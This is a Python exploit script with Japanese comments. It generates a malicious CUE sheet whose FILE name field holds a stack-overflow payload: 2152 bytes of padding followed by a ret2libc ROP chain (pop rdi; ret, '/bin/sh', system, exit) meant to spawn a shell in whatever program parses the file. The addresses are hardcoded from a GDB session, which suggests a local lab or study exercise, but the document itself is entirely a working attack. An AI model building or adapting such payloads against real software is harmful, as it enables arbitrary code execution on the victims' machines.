import struct
import sys

# =========================================================================
# 1. 攻撃に必要な確定アドレス (GDBから取得した実行時のアドレス)
#    ASLR回避のため、GDB実行ごとにこれらのアドレスを更新する必要があります。
# =========================================================================

# (1) RDI設定用ガジェット: pop rdi; ret (NULバイトを含まないアドレス)
ADDR_POP_RDI_RET = 0x7ffff7db343c

# (2) 引数文字列: "/bin/sh" の開始アドレス
ADDR_BIN_SH = 0x7ffff7f57e43

# (3) シェル実行関数: system() のアドレス
ADDR_SYSTEM = 0x7ffff7e028f0

# (4) 終了関数: exit() のアドレス (オプションだが推奨)
ADDR_EXIT = 0x7ffff7df2280

# =========================================================================
# 2. ペイロード構造の定義
# =========================================================================

# パディングの長さ: 2152バイト (0x7fffffffdc38 - 0x7fffffffd3d0)
PADDING_LENGTH = 2152

# パディングデータ
# NULバイトを含まないASCII文字 ('A'や'G'など)を使用
PADDING = b'A' * PADDING_LENGTH

# 攻撃チェーンの構築
# struct.pack('<Q', addr) はアドレスをリトルエンディアンの8バイト形式に変換
ROP_CHAIN = (
    # 1. 最初のRIP: pop rdi; ret ガジェットへジャンプ
    struct.pack('<Q', ADDR_POP_RDI_RET) +
    
    # 2. pop rdi の引数: /bin/sh 文字列のアドレス
    #    -> pop rdi が実行され、RDIレジスタに /bin/sh のアドレスがセットされる
    struct.pack('<Q', ADDR_BIN_SH) +
    
    # 3. ret の次: system() 関数へジャンプ
    #    -> system("/bin/sh") が実行される
    struct.pack('<Q', ADDR_SYSTEM) +
    
    # 4. system() の次: exit() 関数へジャンプ (クリーンな終了)
    struct.pack('<Q', ADDR_EXIT)
)

# 最終的なファイル名ペイロード: パディング + ROPチェーン
PAYLOAD = PADDING + ROP_CHAIN

# =========================================================================
# 3. CUEファイルの生成と書き出し
# =========================================================================

# CUEシートのコンテンツをバイナリ形式で構成
# 注意: PADDING_LENGTHを合わせるため、ここではパディング文字を'G'から'A'に変更しました。
cue_content = b'FILE "' + PAYLOAD + b'" BINARY\nTRACK 01 AUDIO\nINDEX 01 01:00:00\n'

# バイナリモードでファイルに書き出す
# ファイル名には NULバイトを含むバイナリデータが挿入されます。
output_filename = 'exploit_ret2libc.cue'

try:
    with open(output_filename, 'wb') as f:
        f.write(cue_content)
    print(f"[+] 攻撃ペイロードファイル '{output_filename}' を生成しました。")
    print(f"[+] ペイロードの長さ (ファイル名部分): {len(PAYLOAD)} bytes")
    print(f"[!] 攻撃を成功させるには、GDB実行前にこれらのアドレスが有効であることを確認してください。")

except Exception as e:
    print(f"[!] ファイル書き込み中にエラーが発生しました: {e}", file=sys.stderr)